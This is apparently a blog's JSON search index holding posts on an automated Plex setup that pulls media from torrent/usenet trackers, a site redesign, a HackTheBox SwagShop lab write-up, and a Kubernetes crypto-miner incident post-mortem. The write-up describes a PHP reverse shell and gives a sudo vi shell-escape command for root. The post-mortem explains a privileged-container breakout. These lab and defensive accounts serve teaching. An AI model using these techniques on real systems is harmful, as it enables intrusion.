[{"categories":null,"content":"No Plex Zone 8 years ago I started No Plex Zone because my girlfriend during college could not watch her favourite shows on campus. During that time I wanted to get started in my career and decided to build a Plex server and load it up with things we wanted to watch. My friends asked me if they could also use my Plex server and I happily obliged. Then the requests came in. “Hey can you put this on?”, “This episode didn’t download.”, “Is this movie out yet?”. I didn’t mind it, but over time the community around Plex grew and many great tools came out to provide a fully automated experience. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:1:0","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"No Cloud Zone The new and improved No Plex Zone is no longer hosted in a closet at my parents' home. Ignoring my mom’s immeasurable disappointment in no longer having a big black box taking up space, No Plex Zone is now being reliably hosted in a data center with dedicated 1gbps uplink and beefy enough stats for transcoding and application hosting. Server Specifications Intel Core i7-7700 1x SSD M.2 NVMe 512 GB 2x HDD SATA 4,0 TB Enterprise 4x RAM 16384 MB DDR4 In addition to the main server being hosted on the cloud (technically on-prem I guess), all media is now hosted on the now defunct G Suite Business edition plan. 8TB of local space is great, but not enough. Fortunately Google grandfathered my unlimited storage component of that plan into the new Google Workspace. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:2:0","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Automation The first iteration of this media serving project was simply hosting Plex in a Docker container and pointing it at a directory containing all of my media. No Cloud Zone is much much more complex. Before diving into each component and how everything works, this is what the typical user experience looks like. There are two ways to request. Request via Requestrr Request via Overseerr Once a movie has been requested, the requested media usually shows up within the next 10 minutes. Movie successfully requested If the requested media does not exist, it will be downloaded when available and notify the requester via Discord. Automation achieved! Behind the Scenes Before discussing the actual flow of what happens to actually get the media onto Plex after a successful request, I will provide a quick overview of the core infrastructure to give a more comprehensive view on how No Cloud Zone works in its entirety. Later down the road I may put up another post on the code and how each component is implemented. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:0","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Server Management Ansible: Provision and configure the bare-metal severs with core dependencies, configuration, and software. Nomad: Orchestrates running containers while ensuring proper deployment and restarting applications that die for whatever reason. UnionFS: Overlays multiple directories into one mount point. Duplicacy: Automated backups of stateful containers. Prometheus: Provides metrics for host and containers. Vector: Log collection to debug potential issues. Loki: Log aggregation. Grafana: Visualises metrics and logs for hosts and containers. Uptime Kuma: Simple monitoring tool for uptime at a glance. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:1","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Web Traefik: Web server with automatic container discovery with Nomad, allowing software to be accessible via browser. Authelia: Single Sign-On for running web apps, providing authentication and MFA. CloudFlare: Domain name access for web apps, and CDN for better peering and performance for static content. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:2","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Media Servers Plex: Serves movies, TV shows, and music. Kavita: Serves eBooks. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:3","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Media Automation The *Arr stack is the heart of the automation process. This software stack is designed to automatically grab, sort, organise, and monitor media. When a request is sent in from Discord or Overseerr, it is sent to one of the following for processing: Radarr: Movies. Sonarr: TV. Readarr: Books. Lidarr: Music. Other: Prowlarr: Indexer management. Autobrr: Download automation. Each of the above, except for Prowlarr, is designed specifically for the listed type of media. To find available media, an indexer and download client need to be configured. An indexer is a usenet or torrent tracker, and a download client would either be a usenet or bittorrent client. Prowlarr is a tool that optimises searches across different trackers, and configures the other media automation tools accordingly with preferred trackers and associated settings. Prowlarr Indexers Using “Cocaine Bear (2023)” as an example since the first “Cocaine Bear: The True Story (2023)” example does not have many available downloads, Radarr will query the movie tracker configured by Prowlarr and find the most apt release to grab. Radarr Search The score on the right most column indicates the best release given a set of preconfigured parameters. In this case the 1080p version of the movie was requested. For 1080p, the WEB Tier 01 and MA (Movies Anywhere) release has a slightly higher score than the WEB Tier 01 and AMZN (Amazon Prime Video). The scores come from the madman that made TRaSH-Guides. The author provides an excellent guide on how to pick a suitable profile and details on scoring. Quality Profile Flowchart Example [Click to Expand] HD BluRay + Web Score Breakdown [Click to Expand] Radarr also has the capability to monitor for releases. On a certain interval, eg. every 15 minutes, Radarr will check indexer RSS feeds for new releases and see if they match any monitored movies. If there is a match, it will be grabbed. Sonarr, Readarr, and Lidarr are all sister applications and work more or less the same. Autobrr is a companion application that bypasses the RSS feed. Say a very anticipated TV show just came out, such as Game of Thrones at peak, and the RSS search has already been performed the minute before it appeared on indexers. There will be a 15 minute delay, or whatever the interval is, before a search for the latest episode is reattempted. Autobrr monitors IRC channels of popular supported trackers and idles the #announcements channels, waiting for new release. Once there is a match matching a preconfigured preference, it will notify the relevant media automation tool and let it decide if it should be grabbed. Autobrr Dashboard Autobrr Filter Examples [Click to Expand] Radarr and Sonarr has the capability to upgrade releases when they come out. Eg. if a 1080p WEB-DL comes out, and a 1080p BluRay version is released later, the better quality release will be downloaded and replace the older copy. Sometimes there is a valid use case for maintaining two separate versions of the same media, eg. one 1080p version and a 4K version. Two instances of Radarr are run to ensure that both copies will be available instead of being overwritten. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:4","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Cloud Sync and Playback Hosting media on Google Drive has its drawbacks. There is a cap to how much can be uploaded in one day, and API limits, and delay in media startup and seek. Getting rate limited results in noticeable degradation in viewing experience in the form of stuttering and pauses. A couple pieces of software allows playback to be as smooth and seamless as possible. Rclone: Mount Google Drive locally and sync local contents to remote storage. Autoscan: Notifies Plex once new media is available. Cloudplow: Pushes locally downloaded content to Google Drive. UnionFS: Overlays multiple directories into one mount point. Once media is grabbed by the *Arr stack, the file will be imported and hard linked to a new directory under a new file name. Cocaine Bear Original Filename Original Path: /mnt/unionfs/downloads/radarr Original Filename: Cocaine.Bear.2023.1080p.MA.WEB-DL.DDP5.1.Atmos.H.264-CMRG Cocaine Bear New Filename New Path: /mnt/unionfs/Media/Movies/radarr/Cocaine Bear (2023) New Filename: Cocaine Bear (2023) {imdb-tt14209916} [WEBDL-1080p][EAC3 Atmos 5.1][x264]-CMRG.mkv Mentioned previously, UnionFS overlays multiple directories together. When a file is downloaded and imported into its new location and filename, it actually goes to /mnt/local/Media. The RClone mounted Google Drive storage is located at /mnt/remote/Media. The /mnt/unionfs/Media directory shows files present in either the local or remote locations in one place. UnionFS Directory Example Once one of the media automation tools imports the file, it will notify Autoscan. Autoscan listens for requests sent by the *Arr stack and in turn notifies Plex that new media is available at the specified location. This greatly reduces the number of API calls to Google Drive since Plex does not perform its default behaviour of scanning the entire folder for new files. Back to UnionFS, this paradigm has several benefits. Since Plex configured to look for media in the UnionFS mount, it makes no distinction between locally hosted and Google Drive hosted files. Once Autoscan picks new content up, it will be immediately be ready for streaming via Plex. To free up local space, Cloudplow comes into play. Running at a configured interval, it will check if the local media folder exceeds a certain file size. Once that file size has been reached, it will start moving the contents of the local directory over to the remote Rclone mount. The process is seamless and does not interrupt streaming. ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:5","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"Other Tools These are some nice to haves, but not necessary to how Plex and media management functions. Plex Meta Manager: Highly configurable tool to create and maintain collections in Plex. I have not played around with it enough, but so far it dynamically creates collections for holidays, IMDB lists of top movies, Oscar winners, etc. Plex Meta Manager Notifarr: Automatically sync updates to custom profiles from TRaSH-Guides. Additionally notifies on Discord application health issues, newly downloaded content, new application releases, etc. Tautulli: Plex stats. Tautulli ","date":"04-30-2023","objectID":"/posts/running-a-fully-automated-media-center/:3:6","tags":null,"title":"Creating a Fully Automated Media Server","uri":"/posts/running-a-fully-automated-media-center/"},{"categories":null,"content":"It’s been a long while since I’ve updated this blog - almost 4 years. During this time I’ve grown immensely and there were many things worth posting here. Unfortunately I neglected maintaining my personal blog to the point where the main domain doesn’t even work. I started a personal project recently that inspired me to start blogging again, until I saw this disaster. Original Directory Structure Redone Directory Structure I didn’t even have a linter back then and wanted to fix this first before adding more content. ","date":"01-11-2023","objectID":"/posts/bchoy-me-ver-1-22474487139/:0:0","tags":null,"title":"bchoy.me ver.1.22474487139...","uri":"/posts/bchoy-me-ver-1-22474487139/"},{"categories":null,"content":"Original Purpose Originally this domain was purchased with the intention of hosting all my personal projects, thus the blog was located on the blog.bchoy.me subdomain instead of the root one. The root domain would redirect to blog.bchoy.me while other projects lived in their respective subdomains. Since this website is listed on my resume and professional social media, I decided to move my hobby projects to other domains and keep this domain as a portfolio that lives on root https://bchoy.me. ","date":"01-11-2023","objectID":"/posts/bchoy-me-ver-1-22474487139/:1:0","tags":null,"title":"bchoy.me ver.1.22474487139...","uri":"/posts/bchoy-me-ver-1-22474487139/"},{"categories":null,"content":"Issues This blog was originally built using Jekyll when I was a Ruby developer. Many years ago I switched over to Hugo for its feature set and ease of use. I’m not a front end developer so I wanted to start publishing content ASAP… so I hardly read the docs and ended up with the mess of a directory structure in the screenshot above. While cleaning up, I figured the whole site might as well be redone. There were numerous problems due to a combination of neglect and learning over time: Incorrect and non-optimal directory structure. Many posts have incorrect formatting due to not having a Markdown linter. Hugo features not properly being utilised. Images were either too big or too small with no option to enlarge. Code block syntax did not specify a language and syntax highlight was broken. Poor design choices such as font size. ","date":"01-11-2023","objectID":"/posts/bchoy-me-ver-1-22474487139/:2:0","tags":null,"title":"bchoy.me ver.1.22474487139...","uri":"/posts/bchoy-me-ver-1-22474487139/"},{"categories":null,"content":"bchoy.me v…? Similar to NieR Replicant being in between a remaster and a remake, I’m hesitant to call this a redesign. In preparation for upcoming posts, I’ve made the following changes: Overhauled directory structure and links. Eg. https://blog.bchoy.me/post/2015-02-08-no-plex-zone will now be https://bchoy.me/posts/no-plex-zone. Unfortunately all original links are now broken, but I’ll be surprised if anyone linked to and relied on my posts. Added page numbers. I can’t believe I didn’t have this to begin with. While comparing the existing site to my locally developed one, I had to keep scrolling down and hitting “Older Posts” with no idea how many more there was. The Blog header link now shows all posts. Again I can’t believe I didn’t have this to begin with. Collapsible code blocks for cleaner viewing. Basic search functionality has been added. Dark mode toggling! Smaller preview images and smaller text for better visibility. Image enlarging through lightgallery. Gallery view of images also through lightgallery. Table of contents for posts with multiple sections. Went through every post and fixed up code blocks. Some mistakes are preserved and the content is unedited to serve as a marker of how much I’ve grown. Minify assets when deploying. Create Makefile to build and publish. Shout out to LoveIt Hugo for making an excellent theme that does all the heavy lifting. I’ve considered trying out other static site generators such as 11ty and zola but LoveIt is great straight out of the box. Here are some comparison screenshots: Homepage Old Homepage New Homepage Blog Post Old Blog Post New Blog Post Code Block Old Code Block New Code Block Page Numbers Old Page Numbers New Page Numbers ","date":"01-11-2023","objectID":"/posts/bchoy-me-ver-1-22474487139/:3:0","tags":null,"title":"bchoy.me ver.1.22474487139...","uri":"/posts/bchoy-me-ver-1-22474487139/"},{"categories":null,"content":"Next Steps Some improvements for the future: Add tags and/or categories to posts. Read Hugo’s documentation more thoroughly and make better use of the extended Markdown syntax, shortcodes, and other features. Custom styling? For now I’ll be focusing more on adding content and this seems to be a good stopping point. ","date":"01-11-2023","objectID":"/posts/bchoy-me-ver-1-22474487139/:4:0","tags":null,"title":"bchoy.me ver.1.22474487139...","uri":"/posts/bchoy-me-ver-1-22474487139/"},{"categories":null,"content":"Over a year has passed since I’ve last done anything related to penetration testing. I decided to tackle the SwagShop machine on HackTheBox to ease back into things since it has a nice friendly green “Easy” rating. Note: This post is hidden until the machine is “Retired” to avoid spoilers to the community. ","date":"05-19-2019","objectID":"/posts/hackthebox-swagshop/:0:0","tags":null,"title":"HackTheBox SwagShop","uri":"/posts/hackthebox-swagshop/"},{"categories":null,"content":"Enumeration and Information Gathering First thing’s first. HackTheBox gives out the machine IP, so I run a quick nmap scan to look for open ports. $ nmap -v -sS -A -T4 10.10.10.140 ... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA) | 256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA) |_ 256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Home page ... There’s a couple key pieces of information I got from that scan. There’s only two visible services at the moment - OpenSSH 7.2p2 and Apache httpd 2.4.18. I check out what’s running on the web server since that seems like a likely place to find a vulnerability. Magneto Storefront A quick visit using the browser shows that the site is running Magento. Based on the look of the page, it seems to be an old version as well. I ran nikto in the background while looking up some CVEs for Magento to see what vulnerabilities have been reported. $ nikto -h 10.10.10.140 ... + OSVDB-3268: /app/: Directory indexing found. + OSVDB-3092: /app/: This might be interesting... + OSVDB-3268: /includes/: Directory indexing found. + OSVDB-3092: /includes/: This might be interesting... + OSVDB-3268: /lib/: Directory indexing found. + OSVDB-3092: /lib/: This might be interesting... + OSVDB-3092: /install.php: install.php file found. + OSVDB-3092: /LICENSE.txt: License file found may identify site software. + OSVDB-3233: /icons/README: Apache default file found. + /RELEASE_NOTES.txt: A database error may reveal internal details about the running database. + /RELEASE_NOTES.txt: Magento Shop Changelog identified. ... Nikto gives me a pretty good idea of where to look around for more information. The website was carelessly uploaded with unneeded files that can reveal useful information such as a version number. RELEASE_NOTES.txt: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ] NOTE: Current Release Notes are maintained at: [ ] [ ] http://www.magentocommerce.com/knowledge-base/entry/ce-19-later-release-notes [ ] [ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ==== 1.7.0.2 ==== === Fixes === Fixed: Security vulnerability in Zend_XmlRpc - http://framework.zend.com/security/advisory/ZF2012-01 Fixed: PayPal Standard does not display on frontend during checkout with some merchant countries ... Based on the release notes, the version of Magento is probably 1.9.x or lower. Several vulnerabilities for \u003c1.9.x exist, however this one caught my eye. CVE-2019-7139 allows an unauthenticated user to register an account with admin access. Some Googling for information on the vulnerability led to posts referring to this exploit as Shoplift and that it was especially dangerous with the Magpleasure File System extension. ","date":"05-19-2019","objectID":"/posts/hackthebox-swagshop/:1:0","tags":null,"title":"HackTheBox SwagShop","uri":"/posts/hackthebox-swagshop/"},{"categories":null,"content":"Exploiting the Machine A proof of concept for the Shoplift exploit is already available on exploit-db. No modifications needed to be made to execute this and it worked out of the box. The only modification I made was the newly created admin username and password to not clash with anyone else on the box that may have ran the same exploit as me. After gaining access to the admin panel, I familiarised myself with the layout since I never used Magento before, tried to find an easy way to execute code on the host. In the end I ended up installing the Magpleasure File System extension, which allows editing local PHP files in the web server directory. This looks like the perfect way to install a PHP reverse shell. I set up a netcat listener on my host machine and decide to set up my reverse shell in /install.php to avoid interfering with people who are doing the lab at the same time as me. Magneto Admin Panel After hitting /install.php, my local listener granted me user shell access to the server: Reverse Shell ","date":"05-19-2019","objectID":"/posts/hackthebox-swagshop/:2:0","tags":null,"title":"HackTheBox SwagShop","uri":"/posts/hackthebox-swagshop/"},{"categories":null,"content":"Local Privilege Escalation Next step will be figuring out how to escalate user permissions to gain root access. After doing some basic enumeration, I noticed something strange in the /etc/sudoers file: Reverse Shell www-data ALL=NOPASSWD:/usr/bin/vi /var/www/html/* That very last line grants passwordless sudo to www-data, the user I’m currently logged in as, only when using vi in the /var/www/html/* directory. vi and vim both have a feature to exit back to shell with :sh, and sudo is permitted when targeting a specific directory. I can escalate myself to root by using vi to exit back to drop back to the shell that was spawned from the root user because it was executed using sudo: sudo vi /var/www/html/test -c '!sh' The output is messed up since the shell was not configured properly, but no matter. Reverse Shell Root Side Note Shoplift was one of several ways to exploit the machine. Earlier I ran into exposed MySQL credentials when exploring the open web server directory tree, so gaining admin access may have been possible through that avenue. Exposed MySQL Credentials ","date":"05-19-2019","objectID":"/posts/hackthebox-swagshop/:3:0","tags":null,"title":"HackTheBox SwagShop","uri":"/posts/hackthebox-swagshop/"},{"categories":null,"content":"Medium post: https://medium.com/jw-player-engineering/how-a-cryptocurrency-miner-made-its-way-onto-our-internal-kubernetes-clusters-9b09c4704205 The explosion of cryptocurrency in recent years spurred a wave of exploits targeting unsuspecting machines to mine cryptocurrency for the attackers. Earlier in the year, the JW Player DevOps team discovered one of the aforementioned miners running on our development and staging Kubernetes clusters. To be clear, our production cluster was not affected, no JW Player customer data was accessed or exposed, and service was uninterrupted. Malicious actors are not always intent on stealing information or taking a website down, they can be just as content (or more so) in stealing your compute power. We take any intrusion very seriously though, and wanted to share our findings to help other DevOps teams harden their systems. This blog post is broken up into several parts detailing — discovery and diagnosis, our immediate response, discovering and replicating the attack vector, damage assessment, and plans for preventative measures to further protect our systems. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:0:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Discovery Day 0, 21:06 EST: Datadog alerted us (the DevOps team) to a high normalised load average on our staging environment. The cause of the high load averages was determined to be an increased load on one of our legitimate services. This was normal behaviour. Day 1, 2018, 16:53 EST: Another Datadog alert was triggered with the same high normalised load average issue, this time on our development environment. That same service repeatedly triggered alerts from it constantly scaling up and scaling down on both development and staging environments. Due to the initial triage of the previous alert and the volume of incoming alerts of the same type, those alerts were muted until the flux stabilised. Day 3, 17:40 EST: The increased load over the course of 4 days across both clusters was no longer considered normal. Further investigation was necessary to either address the increased load or tweak the Datadog monitors. I logged onto one of the Kubernetes instances via SSH and examined resource consumption using top. A gcc process ran at 100% CPU utilisation and was an immediate suspect for high load averages on the machine. This process was found to be running across every machine in the development and staging clusters. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:1:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Diagnosis Note: All terminal output has been truncated to only show relevant information. A truncated output is denoted with an ellipsis ... . Initially, I believed a defective container was launched through our internal deployment tool and ran gcc. However since the master nodes were affected, that hypothesis seemed incorrect. Since JW Player follows the practice of keeping infrastructure as code, I double checked our repositories for any applied yaml configurations or deployments that ran gcc and found nothing suspicious. For further visibility into why gcc would be running at all, I inspected the process: admin@ip-10-10-201-13:~$ cat /proc/29254/status Name: gcc Umask: 0022 State: S (sleeping) Tgid: 29254 Ngid: 0 Pid: 29254 PPid: 3391 ... admin@ip-10-10-201-13:~$ ps aux | grep 3391 root 3391 0.0 0.0 413632 3740 ? Sl Sep05 0:00 docker-containerd-shim 7f8f77e3ad08b863841cadc833577f27062ed398546f663a8a77f778ba6c8d3d /var/run/docker/libcontainerd/7f8f77e3ad08b863841cadc833577f27062ed398546f663a8a77f778ba6c8d3d docker-runc Strange. A Docker container is running gcc despite our code base stating otherwise. Inspecting the Docker container reveals that Weave Scope was the parent process: admin@ip-10-10-201-13:~$ sudo docker inspect 7f8f77e3ad08b863841cadc833577f27062ed398546f663a8a77f778ba6c8d3d [ { \"Id\": \"7f8f77e3ad08b863841cadc833577f27062ed398546f663a8a77f778ba6c8d3d\", \"Created\": \"2018-09-05T17:45:20.073800454Z\", \"Path\": \"/home/weave/scope\", \"Args\": [ \"--mode=probe\", \"--probe-only\", \"--probe.docker.bridge=docker0\", \"--probe.docker=true\", \"--probe.kubernetes=true\", \"weave-scope-app.weave.svc.cluster.local:80\" ], \"State\": { \"Status\": \"running\", \"Running\": true, \"Paused\": false, \"Restarting\": false, \"OOMKilled\": false, \"Dead\": false, \"Pid\": 3408, \"ExitCode\": 0, \"Error\": \"\", \"StartedAt\": \"2018-09-05T17:45:20.19489647Z\", \"FinishedAt\": \"0001-01-01T00:00:00Z\" }, \"Image\": \"sha256:4b07159e407beba7d74f1986d3b90e3103f33b87269991400ca2fd1eedf1f4eb\", Weave Scope is a tool used to monitor Kubernetes in real time, and there was no reason for it to be running gcc. At this point I found that the \"gcc\" binary was actually a cryptocurrency miner with the filename gcc. objdump: admin@ip-10-10-201-13:/$ objdump -sj .rodata /gcc ... f0c00 584d5269 6720322e 362e320a 20627569 XMRig 2.6.2. bui f0c10 6c74206f 6e204d61 79203330 20323031 lt on May 30 201 f0c20 38207769 74682047 43430000 00000000 8 with GCC...... ... Furthermore, the binary was running from the host machine’s root directory and not from a container. Using Weave Scope to gain more insight into what this container was doing, an outbound connection to a mining pool further confirmed my suspicions. Weave Scope GCC Output Connection ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:2:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Immediate Action Day 3, 19:03 EST: After identifying Weave Scope to be the source of spawning the miner masquerading as gcc, the team was immediately notified. Working in parallel, Weave Scope was stopped and its deployment was removed from all our Kubernetes clusters. Access logs were checked for any signs of unauthorised access to our instances. The gcc process outbound connections were inspected and found to only communicate with a mining pool. A Google search for XMRig led to a GitHub repository for a Monero miner. Combing through the source confirmed that its only function is to mine Monero. One of the affected nodes was isolated from the cluster for future investigation. All nodes in each cluster were rotated out to ensure all affected entities were destroyed and rebuilt. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:3:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Discovering the Attack Vector Finding a cryptocurrency miner on our internal clusters was alarming and indicative of a vulnerability in the software we were running or an issue with our setup. Because Weave Scope was the parent process that spawned the miner, I checked for CVEs related to Weave and Weave Scope, sifted through the GitHub issues, and looked to see if any similar cases existed. No known vulnerabilities were published, no traces of DNS tampering or unauthorised access into our clusters was found, and the Docker image hash for Weave Scope matched the published image on DockerHub. The next step I took to determine an attack vector was launching a new barebones, isolated Kubernetes cluster with our existing deployment method. Watching over the entire process exposed the first issue — the Weave Scope load balancer security group was public facing and exposed to the world. Exposed Security Group Anyone with our load balancer URL can access the Weave Scope dashboard without any authentication. Having metrics exposed to prying eyes will provide attackers information to work with, however one Weave Scope feature, in particular, was abused. The documentation on Weave Scope’s Github repository advertises that one of the features included is the ability to launch a command line on running containers: Interact with and manage containers Launch a command line. Interact with your containers directly: pause, restart and stop containers. Launch a command line. All without leaving the scope browser window. Weave Scope Shell Access In the GUI, the terminal prompt icon presents a user with an interactive shell to the container. Even so, by design containers have a certain amount of separation from its host. An exposed load balancer along with our specific Kubernetes cluster configuration allowed arbitrary code to break out of the container and run on the host instance. Looking at the default Weave Scope configuration file for load balancers for reference, k8s-service-type - Kubernetes service type (for running Scope in Standalone mode), can be either LoadBalancer or NodePort, by default this is unspecified (only internal access) Our deployment was missing the annotation to make the load balancer internal: - apiVersion: v1 kind: Service metadata: name: weave-scope-app annotations: cloud.weave.works/launcher-info: |- { \"original-request\": { \"url\": \"/k8s/v1.8/scope.yaml?k8s-service-type=LoadBalancer\", \"date\": \"Thu Sep 20 2018 17:37:19 GMT+0000 (UTC)\" }, \"email-address\": \"support@weave.works\" } #--TRUNCATED-- spec: ports: - name: app port: 80 protocol: TCP targetPort: 4040 #--TRUNCATED-- type: LoadBalancer The weave-scope container is running with the --privileged flag: spec: containers: - name: scope-agent #--TRUNCATED-- image: \"docker.io/weaveworks/scope:1.9.1\" imagePullPolicy: IfNotPresent securityContext: privileged: true #--TRUNCATED-- Files on the root file system were mounted onto the container: #--TRUNCATED-- volumeMounts: - name: scope-plugins mountPath: /var/run/scope/plugins - name: sys-kernel-debug mountPath: /sys/kernel/debug - name: docker-socket mountPath: /var/run/docker.sock #--TRUNCATED-- Containers are run as the root user. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:4:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Replicating the Attack Simulating the attacker, a scope-agent container would be ideal to run commands on due to having elevated privileges. Weave Scope Exec Shell Access Demonstrated above, the host volume can be mounted onto the Docker container. This matches the listing on the underlying host. I created a simple bash script to run in the background to show that it can run on the host machine as root. Bash Script Running On Host Machine As Root Through SSH on the host machine, the gcc file created through the scope-agent container is visible and running. Host Machine Terminal Output Using the same method as in our original diagnosis, we see that gcc is running and identify the parent: root@ip-10-30-184-17:/# ps aux | grep gcc root 8864 0.0 0.0 1524 4 pts/7 S 16:38 0:00 ash ./gcc root 14730 0.0 0.0 12784 948 pts/4 S+ 16:39 0:00 grep gcc root@ip-10-30-184-17:/# cat /proc/8864/status Name: busybox Umask: 0022 State: S (sleeping) Tgid: 8864 Ngid: 0 Pid: 8864 PPid: 21594 One slight difference here is the parent PID of the gcc bash script points to /bin/ash instead of the Docker container that spawned the process: root 21284 0.0 0.0 12784 1028 pts/4 S+ 16:40 0:00 grep 21594 root 21594 0.0 0.0 1536 960 pts/7 Ss+ 16:30 0:00 /bin/ash root@ip-10-30-184-17:/# cat /proc/21594/status Name: ash Umask: 0022 State: S (sleeping) Tgid: 21594 Ngid: 0 Pid: 21594 PPid: 21578 The parent of that process is a Docker container: root@ip-10-30-184-17:/# ps aux | grep 21578 root 21578 0.0 0.0 199064 3756 ? Sl 16:30 0:00 docker-containerd-shim b9652096ff9a8b524f7d9ce7688e9709fb24bcc31ffa7e7c3484c8cf117cc56a /var/run/docker/libcontainerd/b9652096ff9a8b524f7d9ce7688e9709fb24bcc31ffa7e7c3484c8cf117cc56a docker-runc root 24923 0.0 0.0 12784 988 pts/4 S+ 16:40 0:00 grep 21578 root@ip-10-30-184-17:/# docker inspect b9652096ff9a8b524f7d9ce7688e9709fb24bcc31ffa7e7c3484c8cf117cc56a [ { \"Id\": \"b9652096ff9a8b524f7d9ce7688e9709fb24bcc31ffa7e7c3484c8cf117cc56a\", \"Created\": \"2018-09-20T15:59:01.868162531Z\", \"Path\": \"/home/weave/scope\", \"Args\": [ \"--mode=probe\", \"--probe-only\", \"--probe.docker.bridge=docker0\", \"--probe.docker=true\", \"--probe.kubernetes=true\", \"weave-scope-app.weave.svc.cluster.local:80\" ], \"State\": { \"Status\": \"running\", \"Running\": true, \"Paused\": false, \"Restarting\": false, \"OOMKilled\": false, \"Dead\": false, \"Pid\": 7338, \"ExitCode\": 0, \"Error\": \"\", \"StartedAt\": \"2018-09-20T16:22:57.100773796Z\", \"FinishedAt\": \"2018-09-20T16:22:56.994841933Z\" }, \"Image\": \"sha256:4b07159e407beba7d74f1986d3b90e3103f33b87269991400ca2fd1eedf1f4eb\", The slight difference may be attributed to the attack being automated and more sophisticated than the manual reproduction described. This example is also only one of several ways to break out of a privileged container. If applied to all Weave scope-agent containers, the miner can be executed on all instances since scope-agent is running on each instance to gather metrics. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:5:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes Clusters","uri":"/posts/kubernetes-crypto-miner/"},{"categories":null,"content":"Damage Assessment An unwanted application gaining access to the root directory on all of our Kubernetes nodes is alarming. In addition to our immediate steps, further analysis was imperative to ensure that our data has not been accessed or compromised in any way. Access logs show there were no outside logins into the host machines. The Kubernetes API was not accessed by the intruder. The load balancer URL was not shared and access to the Weave Scope dashboard was discovered by an automated crawler. We verified that running a cryptocurrency miner was the sole purpose of this automated attack. The entire extent of damage done was having 100% CPU usage on one core on each of our Kubernetes instances in our development and staging environments. Pod scheduling and service was uninterrupted. The production cluster was completely unaffected. When designing our Kubernetes 1.10 cluster, we wanted to take advantage of the new and improved RBAC changes since 1.7.4. In the event of a more malicious attack, our current design already contains measures in place to limit access. Our RBAC permissions restricted Weave Scope’s access, scoping it to only the weave namespace. If the Kubernetes API was queried for sensitive information such as our Kubernetes secrets, those requests would be denied. Despite being able to break out of the container and access the underlying host filesystem, no sensitive information is stored on our Kubernetes nodes. No published exploits or CVEs have been reported for our Kubernetes and Docker versions that would allow an attacker to retrieve output from commands run on the underlying host. Even if an attacker were to install and run a listener on the host to run arbitrary code, they would not be able to connect back due to the way our load balancer listeners and networking are set up. To wrap up our damage assessment, an audit was done on all our Kubernetes and custom deployment yaml configuration files, and security groups, to ensure our services were not unintendedly public facing or misconfigured. ","date":"09-20-2018","objectID":"/posts/kubernetes-crypto-miner/:6:0","tags":null,"title":"How A Cryptocurrency Miner Made Its Way onto Our Internal Kubernetes 